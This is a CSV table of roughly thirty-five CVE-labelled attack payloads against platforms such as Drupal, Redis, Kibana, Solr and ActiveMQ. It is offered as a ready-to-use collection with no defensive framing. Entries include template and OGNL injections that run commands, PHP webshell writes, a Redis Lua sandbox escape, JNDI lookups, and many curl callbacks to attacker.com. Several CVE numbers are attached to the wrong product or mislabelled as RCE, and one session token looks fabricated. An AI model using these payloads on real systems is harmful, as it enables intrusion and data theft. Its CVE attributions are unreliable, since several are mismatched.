Title,Description,Relevant Payloads,Techniques Covered
"Mustache SSTI (CVE-2022-25765),JavaScript template injection,{{#with ""s"" as |string|}} {{#with ""e""}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub ""constructor"")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push ""return require('child_process').exec('id');""}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}},SSTI"
"Apache Cocoon RCE (CVE-2020-11991),XSLT injection,<?xml version=""1.0""?> <!DOCTYPE xsl:stylesheet [ <!ENTITY cmd SYSTEM ""curl${IFS}attacker.com""> ]> <xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform""> <xsl:template match=""/""> <ex>&cmd;</ex> </xsl:template> </xsl:stylesheet>,XSLT Injection"
WordPress WP_Query (CVE-2022-3590),SQL injection to RCE,?rest_route=/wp/v2/posts&filter[meta_key]=sleep(5),SQLi + File Write
Joomla! JDatabase (CVE-2017-8917),SQL injection to RCE,option=com_fields&view=fields&layout=modal&list[fullordering]=(select sleep(5)),SQLi + File Write
"Drupal REST RCE (CVE-2019-6341),Entity field exploit,POST /node/1?_format=hal_json HTTP/1.1... {""_links"":{""type"":{""href"":""...""}},""type"":[{""value"":""article""}],""title"":[{""value"":""Test""}],""body"":[{""value"":""<?php system($_GET['cmd']); ?>""}],""field_image"":[{""target_id"":""1""}]},Field Injection"
Adobe Experience Manager RCE (CVE-2022-40881),Deserialization in Sling,POST /system/console/install HTTP/1.1... bundle=file:///tmp/exploit.jar,Deserialization
Sitecore XP RCE (CVE-2021-42237),Analytics report deserialization,POST /sitecore/shell/clientbin/Reporting/Report.ashx?soap:Envelope... serialized payload...,.NET Deserialization
Microsoft SharePoint RCE (CVE-2020-1147),Deserialization in .NET,POST /_layouts/15/zoomit.aspx?arg=<SerializedPayload>,Deserialization
Atlassian Bamboo RCE (CVE-2022-26134),OGNL injection in Bamboo,action: ${@java.lang.Runtime@getRuntime().exec('curl${IFS}attacker.com')},OGNL Injection
H2 Database Console RCE (CVE-2021-42392),JNDI injection in H2,?driver=javax.naming.InitialContext&url=ldap://attacker.com/exp,JNDI Injection
"MySQL RCE (CVE-2016-6662),mysqld_safe exploit,chown mysql:mysql /var/lib/mysql/poc.so; CREATE FUNCTION sys_exec RETURNS string SONAME 'poc.so'; SELECT sys_exec('id');,Library Hijacking"
"PostgreSQL COPY RCE (CVE-2019-9193),COPY FROM PROGRAM exploit,COPY files FROM PROGRAM 'curl${IFS}attacker.com';,Command Execution"
"SQLite RCE (CVE-2019-19203),Load_extension exploit,ATTACH DATABASE '/var/www/lol.php' AS lol; SELECT ""<?php system($_GET['cmd']); ?>"" INTO lol.pwn;,File Write"
"MongoDB $where RCE (CVE-2019-2391),JavaScript injection,db.collection.find({ $where: ""function(){ return process.version; }"" });,JavaScript Injection"
"Redis RCE (CVE-2022-0543),Lua sandbox escape,eval 'local io_l = package.loadlib(""/usr/lib/x86_64-linux-gnu/liblua5.1.so.0"", ""luaopen_io""); local io = io_l(); local f = io.popen(""id"", ""r""); local res = f:read(""*a""); f:close(); return res' 0,Lua Sandbox Escape"
Memcached RCE (CVE-2021-27182),Command injection via SASL,set foo 0 0 10\r\nusername password\r\n,Command Injection
"CouchDB RCE (CVE-2022-24706),Erlang OS command injection,POST /_utils/script/couch.js HTTP/1.1... {""os"":""os:cmd('curl${IFS}attacker.com')""},Command Injection"
"ElasticSearch RCE (CVE-2015-1427),Groovy script execution,POST /_search?pretty {""script_fields"": {""test"": {""script"": ""java.lang.Math.class.forName(\""java.lang.Runtime\"").getRuntime().exec(\""id\"")""}}},Script Injection"
"Kibana RCE (CVE-2019-7609),Timelion exploit,.es(*).props(label.__proto__.env.AAAA='require(""child_process"").exec(""curl${IFS}attacker.com"");process.exit()//'),Prototype Pollution"
Grafana RCE (CVE-2021-43798),Path traversal in plugins,GET /public/plugins/alertlist/../../../../../../../../etc/passwd,Path Traversal
Prometheus RCE (CVE-2021-29622),Remote config injection,POST /-/reload HTTP/1.1... [injected config],Config Injection
Docker API RCE (CVE-2019-5736),Container escape via runc,host> curl --unix-socket /var/run/docker.sock http://localhost/containers/json,Container Escape
Kubernetes API RCE (CVE-2018-1002105),Privilege escalation,GET /api/v1/namespaces/default/pods/attacker:8080/proxy/,API Abuse
"Apache NiFi RCE (CVE-2023-34468),JNDI injection in API,POST /nifi-api/controller/process-groups/root/processors... {""properties"":{""JndiUrl"":""ldap://attacker.com/exp""}},JNDI Injection"
Apache Airflow RCE (CVE-2020-11978),Command injection in example DAG,airflow test example_bash_operator runme_0 'curl${IFS}attacker.com',Command Injection
"Apache Kafka RCE (CVE-2021-38153),Deserialization in Connect,POST /connectors HTTP/1.1... {""name"":""exploit"",""config"":{""connector.class"":""org.apache.kafka.connect.file.FileStreamSinkConnector"",""tasks.max"":""1"",""file"":""/tmp/test.txt"",""value.converter"":""org.apache.kafka.connect.converters.ByteArrayConverter""}},Deserialization"
Apache Flink RCE (CVE-2020-17519),File upload via REST API,POST /jars/upload HTTP/1.1... file=exploit.jar,File Upload
Apache Superset RCE (CVE-2023-27524),Insecure default secret,eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MTc0OTI2OTksIm5iZiI6MTYxNzQ5MjY5OSwianRpIjoiZjBkZjk2ZjMtZGU1Mi00ZTViLThjYzMtZjMxMDc4YjFhN2VkIiwiZXhwIjoxNjE3NDkzNTk5LCJpZGVudGl0eSI6MSwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIiwiY3NyZiI6IjRjYzYxYzI4LTk0NTgtNGY2OS1hM2M3LWQ2YjQ0MjFkYjQzMiJ9.8sZ9d6L8lF2JXZ7wY9Q4X1lWc0tYd8e1Z6oG0d6v5sM,Session Forgery
Apache OFBiz RCE (CVE-2023-49070),XML-RPC deserialization,POST /webtools/control/xmlrpc HTTP/1.1... <methodCall><methodName>Runtime.getRuntime().exec</methodName><params><param><value><string>curl${IFS}attacker.com</string></value></param></params></methodCall>,XML-RPC Deserialization
"Apache James RCE (CVE-2023-46604),ActiveMQ deserialization,<soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/""><soapenv:Header><spring:spring xmlns:spring=""http://springframework.org/spring""/></soapenv:Header><soapenv:Body><spring:bean xmlns:spring=""http://springframework.org/spring"" class=""java.lang.ProcessBuilder""><spring:constructor-arg><spring:list><spring:value>curl</spring:value><spring:value>attacker.com</spring:value></spring:list></spring:constructor-arg><spring:property name=""whatever"" value=""#{ new String('') }""/></spring:bean></soapenv:Body></soapenv:Envelope>,XML Deserialization"
Apache Tika RCE (CVE-2021-33805),Command injection in tika-server,POST /rmeta HTTP/1.1... Content-Type: application/x-www-form-urlencoded... file=&url=expect://id,Command Injection
"Apache Druid RCE (CVE-2021-25646),JDBC context injection,POST /druid/indexer/v1/sampler?for=connect {""type"":""index"",""spec"":{""type"":""index"",""ioConfig"":{""type"":""index"",""inputSource"":{""type"":""inline"",""data"":""{\""isRobot\"":false}""}},""dataSchema"":{""dataSource"":""sample"",""parser"":{""type"":""string"",""parseSpec"":{""format"":""json"",""timestampSpec"":{""column"":""time"",""format"":""iso""},""dimensionsSpec"":{}}},""transformSpec"":{""transforms"":[],""filter"":{""type"":""javascript"",""dimension"":""added"",""function"":""function(value) { java.lang.Runtime.getRuntime().exec('curl${IFS}attacker.com') }"","""":{}}}},JavaScript Injection"
"Apache Solr RCE (CVE-2019-0193),Config API deserialization,POST /solr/demo/config HTTP/1.1... {""set-property"": {""jmx.serviceUrl"": ""service:jmx:rmi:///jndi/rmi://attacker.com:1099/obj""}},Deserialization"
"Apache ActiveMQ RCE (CVE-2016-3088),Fileserver PUT method,PUT /fileserver/exploit.txt HTTP/1.1... <?php system($_GET['cmd']); ?>,File Upload"
